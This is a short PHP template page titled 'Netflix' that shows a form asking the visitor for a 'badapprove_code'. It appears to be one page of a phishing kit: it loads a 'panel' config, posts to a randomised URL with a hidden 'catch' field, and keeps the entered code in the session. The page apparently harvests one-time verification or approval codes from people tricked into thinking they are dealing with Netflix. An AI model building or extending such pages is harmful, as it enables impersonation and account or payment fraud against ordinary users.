<?php
require_once 'config/panel.php';
$title = "Netflix";
ob_start();
?>
<div class="container d-flex flex-column justify-content-start align-items-center my-3">
     <form class="w-100 p-2 d-flex flex-column justify-content-center align-items-center shadow-lg rounded-2" method="post" action="index.php?id=<?= md5(time()) ?>">
     <input type="hidden" name="catch">

     <h1 class="my-4 p-0"><?= lang("xbadapprove1"); ?></h1>

<div class="w-100 form-floating mb-4">
  <input name="badapprove_code" type="text" class="form-control <?php if ($_SESSION['ERRORS']['badapprove_code']) { echo 'is-invalid'; } ?>" placeholder="" value="<?php if (!empty($_SESSION['sbadapprove_code'])){ echo $_SESSION['sbadapprove_code'];} ?>" id="floatingInput" placeholder="name@example.com">
  <label for="floatingInput"><?= lang("xbadapprove2"); ?></label>
  <div class="invalid-feedback"><?= lang("xbadapprove3"); ?></div>
</div>

    <button class="btn btn-danger w-100 m-0 p-0" type="submit" name="submit" value="page_badapprove"><?= lang("xbadapprove4"); ?></button>
  </form>
</div>
<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout_dash.php' ?>
